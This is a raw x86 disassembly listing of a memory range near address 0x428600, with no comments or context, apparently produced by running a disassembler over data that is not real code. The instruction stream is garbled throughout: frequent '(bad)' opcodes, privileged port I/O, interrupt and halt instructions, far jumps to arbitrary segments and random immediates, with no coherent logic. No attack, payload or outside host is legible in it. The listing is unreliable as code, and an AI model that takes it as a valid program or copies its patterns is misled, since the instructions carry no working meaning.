  4285d0:	lods   al,BYTE PTR ds:[esi]
  4285d1:	push   ebx
  4285d2:	jo     0x4285a0
  4285d4:	push   ss
  4285d5:	push   0x499926e8
  4285da:	adc    edx,DWORD PTR [ecx]
  4285dc:	sub    esi,DWORD PTR [ebx-0x70]
  4285df:	jns    0x4285c9
  4285e1:	sti    
  4285e2:	adc    eax,0x1bda9238
  4285e7:	fcmovb st,st(4)
  4285e9:	popa   
  4285ea:	or     ebp,DWORD PTR [ebx-0x2f]
  4285ed:	iret   
  4285ee:	mov    edx,0x5f403098
  4285f3:	fistp  DWORD PTR [esi]
  4285f5:	or     eax,0x8f5a292e
  4285fa:	cli    
  4285fb:	add    al,BYTE PTR [edi-0x23692308]
  428601:	jbe    0x42859a
  428603:	dec    ebx
  428604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428605:	push   ebp
  428606:	xor    eax,0xc267c89d
  42860b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42860c:	retf   0xc765
  42860f:	sbb    ah,ch
  428611:	jbe    0x428651
  428613:	outs   dx,BYTE PTR cs:[esi]
  428615:	xchg   edx,eax
  428616:	out    dx,eax
  428617:	ins    BYTE PTR es:[edi],dx
  428618:	sahf   
  428619:	adc    DWORD PTR [eax],ecx
  42861b:	arpl   WORD PTR [edx-0x3ce11d0d],dx
  428621:	clc    
  428622:	push   edx
  428623:	addr16 xchg esi,eax
  428625:	loope  0x428673
  428627:	lods   eax,DWORD PTR ds:[esi]
  428628:	fs scas al,BYTE PTR es:[edi]
  42862a:	cmp    al,0xc7
  42862c:	jne    0x42868d
  42862e:	pop    edx
  42862f:	aas    
  428630:	mov    DWORD PTR [edi+0x3b890b9c],eax
  428636:	dec    ebp
  428637:	xchg   edi,eax
  428638:	mov    ds:0x34ede706,eax
  42863d:	(bad)  
  42863e:	fnstcw WORD PTR [ecx+edi*1-0x62c178f0]
  428645:	(bad)  
  428646:	sti    
  428647:	and    edi,eax
  428649:	cmp    esi,DWORD PTR [ecx]
  42864b:	out    dx,eax
  42864c:	add    ebx,DWORD PTR [ebx+0x11]
  42864f:	and    al,0xf2
  428651:	inc    edi
  428652:	cmp    eax,edx
  428654:	or     bh,BYTE PTR [bp+0x1b]
  428658:	(bad)  [ebx+0x1d792010]
  42865e:	fbstp  TBYTE PTR [esi+0x38]
  428661:	or     al,0xfb
  428663:	pushf  
  428664:	inc    esp
  428665:	divps  xmm7,XMMWORD PTR [edi]
  428668:	mov    bh,0x70
  42866a:	inc    ebp
  42866b:	mov    dh,0xa4
  42866d:	lods   al,BYTE PTR ds:[esi]
  42866e:	in     eax,dx
  42866f:	mov    eax,ds:0xeab1ad69
  428674:	push   esp
  428675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428676:	sbb    DWORD PTR [ebp-0x56],edi
  428679:	mov    eax,0xd9486881
  42867e:	sub    DWORD PTR [ecx-0x294f97d1],edi
  428684:	sti    
  428685:	shr    BYTE PTR [ebp+eax*4+0x1b22ec43],1
  42868c:	retf   0x1ad8
  42868f:	mov    ecx,0x192ba19e
  428694:	xchg   ecx,eax
  428695:	or     DWORD PTR ds:0x868ba68a,ebx
  42869b:	adc    dh,BYTE PTR [eax+0x27]
  42869e:	stos   BYTE PTR es:[edi],al
  42869f:	aam    0x3b
  4286a1:	push   ebp
  4286a2:	xor    bl,BYTE PTR [eax-0x7e91b260]
  4286a8:	push   0x49dfff83
  4286ad:	push   esi
  4286ae:	mov    DWORD PTR [ebx-0x761a8f03],edx
  4286b4:	into   
	...
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x2fa6d48f]
  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR [ecx+0x4e04dd8b],dh
  428733:	fsub   st,st(6)
  428735:	push   edx
  428736:	push   ds
  428737:	push   edi
  428738:	test   eax,0x917f8aab
  42873d:	and    al,0x98
  42873f:	loop   0x428771
  428741:	nop
  428742:	jo     0x42878e
  428744:	xchg   ecx,eax
  428745:	xchg   esp,eax
  428746:	push   ss
  428747:	std    
  428748:	push   ebp
  428749:	popa   
  42874a:	mov    ds:0x6608584c,eax
  42874f:	(bad)  
  428750:	stos   DWORD PTR es:[edi],eax
  428751:	stc    
  428752:	loope  0x4286e4
  428754:	shl    bh,1
  428756:	inc    edx
  428757:	push   esi
  428758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428759:	adc    cl,BYTE PTR [edi-0x48]
  42875c:	jle    0x4287da
  42875e:	dec    esp
  42875f:	sbb    eax,0x76acba
  428764:	dec    esp
  428765:	or     DWORD PTR [ebp-0x33],ebp
  428768:	pop    es
  428769:	dec    ecx
  42876a:	repnz adc BYTE PTR [edx+0x7803dd81],al
  428771:	add    bh,cl
  428773:	ins    BYTE PTR es:[edi],dx
  428774:	pusha  
  428775:	cmp    dl,BYTE PTR [eax]
  428777:	sub    BYTE PTR [eax],dh
  428779:	inc    ebp
  42877a:	adc    eax,DWORD PTR [esi+0x4f]
  42877d:	rcr    BYTE PTR [edi+0x75],cl
  428780:	loopne 0x4287a4
  428782:	call   0x8e9c:0xd20849b6
  428789:	arpl   WORD PTR [edi-0x5b],dx
  42878c:	lods   al,BYTE PTR ds:[esi]
  42878d:	test   al,0xa7
  42878f:	(bad)  
  428790:	ds in  al,dx
  428792:	sbb    edx,DWORD PTR [edx]
  428794:	lds    esp,FWORD PTR [edi-0x5a8467d4]
  42879a:	sub    cl,BYTE PTR [edx-0x52]
  42879d:	mov    bl,0x81
  42879f:	mov    ebp,cs
  4287a1:	lods   eax,DWORD PTR ds:[esi]
  4287a2:	mov    dl,BYTE PTR [esi+0x7b257f93]
  4287a8:	and    al,0x40
  4287aa:	push   0xfffffff5
  4287ac:	(bad)  
  4287ad:	call   0xbb2ad645
  4287b2:	cwde   
  4287b3:	jns    0x4287cb
  4287b5:	dec    edi
  4287b6:	xor    BYTE PTR [esi+esi*8],0xa0
  4287ba:	loopne 0x42880c
  4287bc:	dec    ebx
  4287bd:	pop    esi
  4287be:	int    0x98
  4287c0:	mov    al,0x81
  4287c2:	mov    BYTE PTR [esi+ebx*8-0x55],bh
  4287c6:	ds ins BYTE PTR es:[edi],dx
  4287c8:	mov    ds,WORD PTR [edx+0x221048ad]
  4287ce:	dec    edi
  4287cf:	mov    ebx,ebp
  4287d1:	loop   0x42880b
  4287d3:	pusha  
  4287d4:	ja     0x428848
  4287d6:	jns    0x4287ac
  4287d8:	popa   
  4287d9:	mov    BYTE PTR [ecx+esi*2-0x1cabd35d],0x4b
  4287e1:	out    0x61,eax
  4287e3:	popa   
  4287e4:	fimul  WORD PTR [ebp+0x23077f1e]
  4287ea:	retf   
  4287eb:	dec    bx
  4287ed:	push   ds
  4287ee:	rcl    DWORD PTR [ecx+0xbf6d895],1
  4287f4:	test   DWORD PTR [edi+0x1daab176],ebx
  4287fa:	daa    
  4287fb:	int3   
  4287fc:	sub    BYTE PTR [eax],dh
  4287fe:	aad    0x20
  428800:	test   BYTE PTR [edx+0x6c],0xe5
  428804:	pop    esi
  428805:	jp     0x4287e8
  428807:	hlt    
  428808:	pop    ebp
  428809:	outs   dx,BYTE PTR ds:[esi]
  42880a:	pop    ds
  42880b:	add    BYTE PTR [edi-0x5d],al
  42880e:	icebp  
  42880f:	mov    bh,al
  428811:	sbb    DWORD PTR [ebp-0x4527d1d9],esi
  428817:	movlps xmm6,QWORD PTR [eax]
  42881a:	loop   0x42889b
  42881c:	iret   
  42881d:	dec    eax
  42881e:	cld    
  42881f:	clc    
  428820:	daa    
  428821:	loop   0x4287fe
  428823:	mov    ebx,0xe1c1cbea
  428828:	push   ebp
  428829:	add    al,0xeb
  42882b:	pop    esi
  42882c:	fnstcw WORD PTR [ecx+0x1d49ea4]
  428832:	and    bl,BYTE PTR [ebx+eiz*4+0x0]
	...
  428895:	add    BYTE PTR [esi],ah
  428897:	jp     0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [edx-0xe3d50fe],eax
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [ecx-0x6c88668d],dh
  4288b3:	cmp    al,BYTE PTR [esi+0x2d]
  4288b6:	jb     0x42886d
  4288b8:	jg     0x428902
  4288ba:	into   
  4288bb:	out    0x42,al
  4288bd:	pop    eax
  4288be:	fadd   QWORD PTR ds:0xe48a95ab
  4288c4:	or     BYTE PTR ds:0x8f45ca84,bl
  4288ca:	ficomp WORD PTR [ebp-0x7b217b48]
  4288d0:	pop    ss
  4288d1:	cdq    
  4288d2:	mov    WORD PTR [ebx-0x3e],fs
  4288d5:	or     al,0x6f
  4288d7:	mov    ch,0xdf
  4288d9:	repnz ins BYTE PTR es:[edi],dx
  4288db:	dec    edx
  4288dc:	fs xchg esi,eax
  4288de:	stos   DWORD PTR es:[edi],eax
  4288df:	sbb    BYTE PTR [edx+0x4e],ah
  4288e2:	push   ss
  4288e3:	test   al,0x4e
  4288e5:	add    eax,0xc34a6b42
  4288ea:	push   cs
  4288eb:	jg     0x428955
  4288ed:	mov    ebp,0x621e6533
  4288f2:	dec    ecx
  4288f3:	idiv   BYTE PTR [ecx+0x59]
  4288f6:	hlt    
  4288f7:	dec    edi
  4288f8:	js     0x42896b
  4288fa:	pop    edi
  4288fb:	xchg   edi,eax
  4288fc:	jg     0x428936
  4288fe:	mov    BYTE PTR [ebx+0x1dad36f1],dl
  428904:	mov    BYTE PTR ds:0xc1837f08,dh
  42890a:	int    0x16
  42890c:	stos   BYTE PTR es:[edi],al
  42890d:	aas    
  42890e:	jge    0x42892c
  428910:	(bad)
  428913:	push   0x145aa459
  428918:	xacquire xchg DWORD PTR [ecx-0x53],edi
  42891c:	stos   DWORD PTR es:[edi],eax
  42891d:	push   ebp
  42891e:	ror    BYTE PTR [edi*2+0x21d752a4],1
  428925:	jns    0x4288bc
  428927:	mov    ebp,0x455c27ce
  42892c:	imul   esp,DWORD PTR [ebx+ebx*1+0x18470af1],0xfffffff2
  428934:	sahf   
  428935:	popf   
  428936:	sub    DWORD PTR [eax],ebx
  428938:	xchg   edi,eax
  428939:	mov    ch,0x1d
  42893b:	retf   0xab2
  42893e:	pop    esi
  42893f:	jp     0x42890d
  428941:	mov    eax,0xf097b7fa
  428946:	icebp  
  428947:	xchg   edi,eax
  428948:	push   eax
  428949:	dec    edx
  42894a:	jmp    FWORD PTR [ecx-0xa]
  42894d:	fld    TBYTE PTR [ebx+0x566ca1e4]
  428953:	enter  0xd64a,0x2
  428957:	jns    0x428921
  428959:	xchg   ebx,eax
  42895a:	mov    BYTE PTR [esi+ecx*4-0x6],dh
  42895e:	aaa    
  42895f:	push   cs
  428960:	call   0x64ccaaa6
  428965:	sub    eax,0xd24113b0
  42896a:	cdq    
  42896b:	push   esp
  42896c:	push   cs
  42896d:	jl     0x428975
  42896f:	jns    0x42897c
  428971:	shl    DWORD PTR [eax-0x68],cl
  428974:	jns    0x428976
  428976:	stos   BYTE PTR es:[edi],al
  428977:	das    
  428978:	addr16 push ebx
  42897a:	jns    0x428971
  42897c:	jge    0x42890b
  42897e:	leave  
  42897f:	lahf   
  428980:	test   ebx,edx
  428982:	and    DWORD PTR [ebp+0x5e12558c],eax
  428988:	sub    al,0x23
  42898a:	push   ss
  42898b:	cmp    eax,0x41cc3d1
  428990:	loope  0x4289eb
  428992:	es push edx
  428994:	jns    0x428984
  428996:	dec    eax
  428997:	jmp    0x89dc:0x3623f6bf
  42899e:	cmp    BYTE PTR [ecx-0x77],0x92
  4289a2:	gs mov bl,0xdc
  4289a5:	dec    edi
  4289a6:	call   0x5040:0x8fa66a37
  4289ad:	add    dl,BYTE PTR [ebp+0x7aa8b86e]
  4289b3:	out    0xe2,eax
	...
  428a15:	add    BYTE PTR [ebp+0xc],cl
  428a18:	clc    
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	mov    bh,0x8a
  428a24:	popa   
  428a25:	dec    ecx
  428a26:	clc    
  428a27:	mov    cl,0x1
  428a29:	add    BYTE PTR [edi],al
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR [ebx],dl
  428a2f:	cmp    eax,edi
  428a31:	add    DWORD PTR [edi+ebp*1-0x2efd12d9],edi
  428a38:	and    ecx,DWORD PTR [ebp-0x1ebfe9d2]
  428a3e:	add    al,0xc7
  428a40:	fmul   st,st(6)
  428a42:	ds or  ebx,edi
  428a45:	pop    eax
  428a46:	sub    DWORD PTR ds:0xdf65d03,0xdeaef08d
  428a50:	inc    edx
  428a51:	xchg   BYTE PTR [edi],bh
  428a53:	in     al,0x20
  428a55:	(bad)  
  428a57:	(bad)  
  428a58:	or     ah,BYTE PTR [esi]
  428a5a:	scas   eax,DWORD PTR es:[edi]
  428a5b:	cld    
  428a5c:	and    edi,DWORD PTR [ebp-0x64]
  428a5f:	or     ecx,edx
  428a61:	jmp    0xa24c:0x9da5613
  428a68:	sbb    eax,0xc3900b8c
  428a6d:	popa   
  428a6e:	mov    eax,0x697360c8
  428a73:	or     eax,0xcb2b93b2
  428a78:	or     DWORD PTR [ecx],0x43
  428a7b:	mov    DWORD PTR [eax],0xac44b9bc
  428a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a82:	int    0xbf
  428a84:	repz dec edx
  428a86:	mov    eax,0x7feca983
  428a8b:	out    dx,eax
  428a8c:	fld    DWORD PTR [edx-0x65628098]
  428a92:	push   edi
  428a93:	scas   eax,DWORD PTR es:[edi]
  428a94:	fwait
  428a95:	xchg   edi,eax
  428a96:	jnp    0x428a35
  428a98:	fs (bad) 
  428a9b:	out    dx,al
  428a9c:	adc    al,0x3c
  428a9e:	push   esp
  428a9f:	enter  0x3e12,0xf0
  428aa3:	jp     0x428a6e
  428aa5:	outs   dx,DWORD PTR ds:[esi]
  428aa6:	je     0x428a6a
  428aa8:	stos   DWORD PTR es:[edi],eax
  428aa9:	jb     0x428a6e
  428aab:	(bad)  
  428aac:	mov    ds:0x797c8f40,al
  428ab1:	push   ss
  428ab2:	mov    esp,0x21d60488
  428ab7:	push   eax
  428ab8:	out    dx,eax
  428ab9:	add    BYTE PTR [esi+0x7cebf3b6],cl
  428abf:	sar    BYTE PTR [eax],cl
  428ac1:	dec    esi
  428ac2:	popf   
  428ac3:	fst    QWORD PTR [edi]
  428ac5:	lahf   
  428ac6:	mov    DWORD PTR [edx-0x5cb180f6],ebx
  428acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428acd:	lods   eax,DWORD PTR ds:[esi]
  428ace:	in     eax,0xc
  428ad0:	shr    DWORD PTR [ebx],1
  428ad2:	add    DWORD PTR [edi],ebx
  428ad4:	jb     0x428b33
  428ad6:	retf   0x66a2
  428ad9:	imul   ecx,esp,0x60
  428adc:	mov    ch,0x57
  428ade:	dec    esi
  428adf:	pop    ebp
  428ae0:	daa    
  428ae1:	cmp    eax,esp
  428ae3:	repz jecxz 0x428a7b
  428ae6:	adc    edi,DWORD PTR [edx+esi*1-0x51]
  428aea:	inc    ebx
  428aeb:	jbe    0x428a7b
  428aed:	and    al,0x63
  428aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428af0:	xlat   BYTE PTR ds:[ebx]
  428af1:	adc    al,0x4f
  428af3:	push   ebx
  428af4:	lock jmp 0x5ab24810
  428afa:	ja     0x428ac0
  428afc:	clc    
  428afd:	mov    ecx,0x9df81f7e
  428b02:	sar    bl,0xd6
  428b05:	sub    BYTE PTR [eax+ebx*8+0x1c6556ff],al
  428b0c:	out    0x83,al
  428b0e:	test   eax,0x53876e96
  428b13:	jg     0x428b2a
  428b15:	(bad)  
  428b16:	add    BYTE PTR ss:[edx-0x51],bh
  428b1a:	mov    eax,0xebb5f9de
  428b1f:	and    dh,BYTE PTR [ecx*1+0x61999a49]
  428b26:	mov    ebx,0x3ef76559
  428b2b:	hlt    
  428b2c:	adc    eax,DWORD PTR [esi+ecx*4]
  428b2f:	ficomp WORD PTR ds:0xf0731db8
	...
  428b95:	add    ch,al
  428b97:	push   ebp
  428b98:	mov    bh,dl
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0xca1eba05
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	out    dx,al
  428baf:	into   
  428bb0:	push   es
  428bb1:	pop    es
  428bb2:	inc    edx
  428bb3:	fs scas al,BYTE PTR es:[edi]
  428bb5:	xor    DWORD PTR [esi],ebx
  428bb7:	out    0xae,al
  428bb9:	inc    ecx
  428bba:	jg     0x428b76
  428bbc:	sbb    DWORD PTR [ecx+0x1e6d29f2],esi
  428bc2:	push   esi
  428bc3:	leave  
  428bc4:	fst    QWORD PTR [edx-0x185bb50f]
  428bca:	loopne 0x428bd8
  428bcc:	inc    esp
  428bcd:	mov    bh,0x25
  428bcf:	ja     0x428bb9
  428bd1:	adc    dl,BYTE PTR [edi]
  428bd3:	xor    al,BYTE PTR [edi]
  428bd5:	push   edi
  428bd6:	clc    
  428bd7:	adc    ah,bh
  428bd9:	inc    edi
  428bda:	push   edi
  428bdb:	dec    DWORD PTR [eax+0x2d]
  428bde:	cmp    DWORD PTR [ecx+ecx*4-0x34a7a201],0xffffffb4
  428be6:	dec    ecx
  428be7:	and    eax,0x38dcbd50
  428bec:	mov    edi,0xff86a9a1
  428bf1:	popa   
  428bf2:	mov    ah,0xab
  428bf4:	je     0x428c58
  428bf6:	add    dl,BYTE PTR [ecx-0x2033d9b7]
  428bfc:	ins    DWORD PTR es:[edi],dx
  428bfd:	in     al,0x48
  428bff:	ror    BYTE PTR [ebp+eiz*8-0x7f],0x67
  428c04:	xlat   BYTE PTR ds:[ebx]
  428c05:	or     bh,ch
  428c07:	or     edx,ebx
  428c09:	(bad)
  428c0e:	mov    ecx,0x54f820a6
  428c13:	lahf   
  428c14:	in     eax,dx
  428c15:	mov    esp,0xe18933a4
  428c1a:	popf   
  428c1b:	dec    esi
  428c1c:	or     eax,DWORD PTR [eax+0x7b265efd]
  428c22:	fwait
  428c23:	adc    al,0xdc
  428c25:	jmp    0xb074:0xd85153a
  428c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c2d:	shl    BYTE PTR [ebp+0x2d77a1f7],1
  428c33:	popa   
  428c34:	xor    edx,edx
  428c36:	and    BYTE PTR [ecx+0x33],bl
  428c39:	test   al,0x27
  428c3b:	mov    ds:0xf453e143,al
  428c40:	hlt    
  428c41:	loopne 0x428be3
  428c43:	jge    0x428c14
  428c45:	jno    0x428c76
  428c47:	adc    bl,0xf7
  428c4a:	and    al,0x7
  428c4c:	xor    ebx,DWORD PTR [edi]
  428c4e:	pop    edx
  428c4f:	xor    bl,dl
  428c51:	and    BYTE PTR [ebp-0x3b],cl
  428c54:	inc    ecx
  428c55:	add    esp,ebp
  428c57:	call   0xaa08:0x39a561f1
  428c5e:	test   BYTE PTR [edi-0x75],al
  428c61:	mov    ebp,0x325b7251
  428c66:	lods   al,BYTE PTR ds:[esi]
  428c67:	push   edi
  428c68:	push   ds
  428c69:	out    0x5,eax
  428c6b:	mov    ch,0x75
  428c6d:	scas   eax,DWORD PTR es:[edi]
  428c6e:	inc    ecx
  428c6f:	adc    eax,0x21ac4398
  428c74:	lods   al,BYTE PTR ds:[esi]
  428c75:	cmp    BYTE PTR [eax+0x51976cfd],dh
  428c7b:	fisttp QWORD PTR [edx-0x7d48a4c4]
  428c81:	sub    cl,BYTE PTR [ecx+ecx*1-0x5d]
  428c85:	or     eax,0xf5392b8d
  428c8a:	push   edi
  428c8b:	cmp    ebp,DWORD PTR [ebp-0x6f637197]
  428c91:	scas   eax,DWORD PTR es:[edi]
  428c92:	jo     0x428cb8
  428c94:	cmc    
  428c95:	lahf   
  428c96:	jb     0x428c99
  428c98:	mov    dh,0xa1
  428c9a:	cld    
  428c9b:	pop    ss
  428c9c:	rol    ebx,cl
  428c9e:	mov    ecx,0x10f46a99
  428ca3:	(bad)  
  428ca5:	cwde   
  428ca6:	fistp  WORD PTR [edx+0x1]
  428ca9:	or     BYTE PTR [ebx],0xb4
  428cac:	xchg   edx,eax
  428cad:	dec    edx
  428cae:	daa    
  428caf:	cwde   
  428cb0:	rol    DWORD PTR [ebx-0x1],cl
  428cb3:	ret    0xe0
	...
  428d16:	xor    DWORD PTR [ebp+0x75f531f1],0x9686b5c1
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428ccb
  428d23:	push   cs
  428d24:	or     DWORD PTR [edi],esp
  428d26:	push   es
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    BYTE PTR [edx+0x4b],bl
  428d30:	and    dh,BYTE PTR [eax]
  428d32:	fldcw  WORD PTR [edx+0x35657cfa]
  428d38:	pop    edi
  428d39:	repnz mov edx,DWORD PTR [ebx-0x47edbcbc]
  428d40:	mov    DWORD PTR [ebp-0x54b95ff0],ebx
  428d46:	iret   
  428d47:	test   DWORD PTR ds:0xbbe1cf31,esi
  428d4d:	fild   QWORD PTR [ebx]
  428d4f:	mov    al,BYTE PTR [edx]
  428d51:	aam    0x3b
  428d53:	je     0x428d63
  428d55:	std    
  428d56:	jge    0x428d87
  428d58:	fs repz mov edi,0xf73f80a9
  428d5f:	int    0x3e
  428d61:	push   esp
  428d62:	not    dh
  428d64:	sub    edx,0xffffffec
  428d67:	pushf  
  428d68:	dec    ebp
  428d69:	xchg   edi,eax
  428d6a:	shr    BYTE PTR [ecx],0x8c
  428d6d:	retf   0x1437
  428d70:	iret   
  428d71:	lock jl 0x428d80
  428d74:	mov    eax,esi
  428d76:	dec    edx
  428d77:	xchg   edi,eax
  428d78:	inc    edi
  428d79:	mov    esi,0xc568de21
  428d7e:	mov    al,0x93
  428d80:	cmp    BYTE PTR [esi],cl
  428d82:	mov    eax,0x22adc321
  428d87:	dec    esp
  428d88:	popf   
  428d89:	popa   
  428d8a:	pusha  
  428d8b:	mov    cl,0xc2
  428d8d:	out    dx,al
  428d8e:	(bad)  
  428d90:	not    BYTE PTR [edi]
  428d92:	dec    ebp
  428d93:	push   cs
  428d94:	mov    ecx,0x1b0350a9
  428d99:	push   ecx
  428d9a:	sub    al,BYTE PTR [ebp+0xe]
  428d9d:	scas   eax,DWORD PTR es:[edi]
  428d9e:	nop
  428d9f:	hlt    
  428da0:	scas   eax,DWORD PTR es:[edi]
  428da1:	test   BYTE PTR [ebp-0x3f],bh
  428da4:	xor    DWORD PTR [edi+0x4a208576],ebp
  428daa:	call   0x7aad8f5b
  428daf:	mov    edi,0x8c3bc157
  428db4:	ret    
  428db5:	scas   eax,DWORD PTR es:[edi]
  428db6:	out    0xf0,eax
  428db8:	inc    ecx
  428db9:	push   ds
  428dba:	pop    edi
  428dbb:	loope  0x428e1c
  428dbd:	adc    al,0x51
  428dbf:	lds    ecx,FWORD PTR [ebp+0x14752b6d]
  428dc5:	test   BYTE PTR [ecx+ecx*8+0x6b1e711b],dh
  428dcc:	sub    edx,DWORD PTR [ecx-0x2890773b]
  428dd2:	push   cs
  428dd3:	xor    DWORD PTR [edi-0x5f1cdd0d],0x35ffb81e
  428ddd:	mov    al,0xc9
  428ddf:	cli    
  428de0:	enter  0x3a16,0xfc
  428de4:	lahf   
  428de5:	mov    ecx,0x65293697
  428dea:	sbb    al,0x63
  428dec:	pop    edi
  428ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428dee:	mov    DWORD PTR [eax+0x73e80e71],esi
  428df4:	mov    ah,0x5b
  428df6:	xchg   ebp,eax
  428df7:	sar    BYTE PTR [edx-0x548ed0e5],0xf2
  428dfe:	mov    bh,0xbf
  428e00:	add    BYTE PTR [ecx],0x82
  428e03:	cwde   
  428e04:	or     ecx,ebx
  428e06:	jno    0x428e3b
  428e08:	pop    esp
  428e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e0a:	fisubr DWORD PTR [edi+eax*1+0xc]
  428e0e:	ins    BYTE PTR es:[edi],dx
  428e0f:	fwait
  428e10:	jns    0x428dfc
  428e12:	push   cs
  428e13:	ret    
  428e14:	pop    edi
  428e15:	lods   eax,DWORD PTR ds:[esi]
  428e16:	mov    esp,ebp
  428e18:	inc    ecx
  428e19:	xchg   ebx,eax
  428e1a:	dec    edi
  428e1b:	test   DWORD PTR [edx],edi
  428e1d:	inc    eax
  428e1e:	aaa    
  428e1f:	call   0x881:0x52500ef3
  428e26:	aad    0x5a
  428e28:	add    al,0x8c
  428e2a:	cmp    BYTE PTR [edx],bl
  428e2c:	sub    edi,DWORD PTR [ebx-0x1bbda0dd]
  428e32:	pop    ecx
  428e33:	(bad)  
  428e34:	inc    edi
	...
  428e95:	add    BYTE PTR [edi+0x5d],cl
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	shl    DWORD PTR [edx-0x4af2d42a],cl
  428ea8:	add    DWORD PTR [eax],eax
  428eaa:	pop    es
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    bh,al
  428eaf:	outs   dx,BYTE PTR ds:[esi]
  428eb0:	mov    ebp,gs
  428eb2:	add    BYTE PTR [esi],al
  428eb4:	xor    DWORD PTR [esi+0x6a],ebp
  428eb7:	push   es
  428eb8:	(bad)  
  428eb9:	mov    esp,DWORD PTR [esi+0xa]
  428ebc:	push   ebx
  428ebd:	lahf   
  428ebe:	mov    al,0xd7
  428ec0:	mov    ds,WORD PTR [ecx]
  428ec2:	mov    eax,0x561fc3ba
  428ec7:	sbb    eax,0xf459fa5e
  428ecc:	xchg   edx,eax
  428ecd:	mov    dl,0x1a
  428ecf:	fld    QWORD PTR [edx]
  428ed1:	jne    0x428f0d
  428ed3:	pop    esp
  428ed4:	push   ebp
  428ed5:	mov    bl,0x77
  428ed7:	stc    
  428ed8:	inc    ebp
  428ed9:	sub    edx,esi
  428edb:	pop    edi
  428edd:	scas   al,BYTE PTR es:[edi]
  428ede:	mov    dh,0xad
  428ee0:	add    BYTE PTR [ebx],0xb3
  428ee3:	xchg   ecx,eax
  428ee4:	fnstsw WORD PTR [edi+0x29]
  428ee7:	cli    
  428ee8:	or     DWORD PTR [esi-0x21206e01],0xfffffff5
  428eef:	sbb    BYTE PTR [ebp-0x50],ah
  428ef2:	jge    0x428f10
  428ef4:	sbb    al,0xc4
  428ef6:	jg     0x428e79
  428ef8:	cmc    
  428ef9:	imul   eax,DWORD PTR [edi],0xcb0b6705
  428eff:	inc    eax
  428f00:	mov    eax,ds:0xb439897e
  428f05:	and    al,0x48
  428f07:	int    0x55
  428f09:	fisub  DWORD PTR [edx-0x56]
  428f0c:	in     eax,dx
  428f0d:	mov    eax,ds:0x85a6ddd3
  428f13:	retf   
  428f14:	(bad)  
  428f16:	and    al,0x3
  428f18:	pmaddwd mm3,mm1
  428f1b:	mov    al,ds:0x4255e2f9
  428f20:	inc    esp
  428f21:	jecxz  0x428eba
  428f23:	sbb    dl,al
  428f25:	pop    ds
  428f26:	cli    
  428f27:	jmp    0xaba4:0x45a4436e
  428f2e:	mov    WORD PTR [edx+0x4a],ds
  428f31:	jp     0x428f01
  428f33:	or     al,0x88
  428f35:	in     eax,0xf6
  428f37:	mov    ah,0x6a
  428f39:	pop    esp
  428f3a:	fwait
  428f3b:	je     0x428f7c
  428f3d:	rol    esi,0x30
  428f40:	stos   BYTE PTR es:[edi],al
  428f41:	into   
  428f42:	ins    BYTE PTR es:[edi],dx
  428f43:	mov    edx,0x6b7a3baa
  428f48:	out    dx,al
  428f49:	sahf   
  428f4a:	mov    ds:0x5e58fffe,eax
  428f4f:	jo     0x428f17
  428f51:	push   eax
  428f52:	dec    eax
  428f53:	mov    ds:0xe4d2a720,al
  428f58:	xor    BYTE PTR [eax],ah
  428f5a:	and    dl,ch
  428f5c:	cli    
  428f5d:	mov    cl,0x31
  428f5f:	jnp    0x428fcf
  428f61:	add    BYTE PTR [edi+0x388e505],bl
  428f67:	jb     0x428f36
  428f69:	fsubrp st(3),st
  428f6b:	enter  0x6dd9,0xd1
  428f6f:	aam    0xdd
  428f71:	jge    0x428faf
  428f73:	imul   ebx,DWORD PTR [esi+ebp*1-0x28],0xba656b71
  428f7b:	jg     0x428f43
  428f7d:	mov    eax,ds:0xad1e250c
  428f82:	int    0x82
  428f84:	loop   0x428f40
  428f86:	push   edx
  428f87:	and    ch,BYTE PTR [eax]
  428f89:	sbb    BYTE PTR [edx+0x3c],bl
  428f8c:	rcr    bl,0x84
  428f8f:	jmp    0xdb191d1b
  428f94:	fild   QWORD PTR [ebx+0x17]
  428f97:	rol    BYTE PTR [ebx-0x3e83145],0xae
  428f9e:	add    eax,DWORD PTR [ebp-0x7d]
  428fa1:	loop   0x428f80
  428fa3:	das    
  428fa4:	hlt    
  428fa5:	scas   al,BYTE PTR es:[edi]
  428fa6:	call   0x4d6f:0x9d606f56
  428fad:	stos   BYTE PTR es:[edi],al
  428fae:	push   edx
  428faf:	adc    eax,esi
  428fb1:	add    ah,BYTE PTR [esi-0x5c]
  428fb4:	push   cs
	...
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
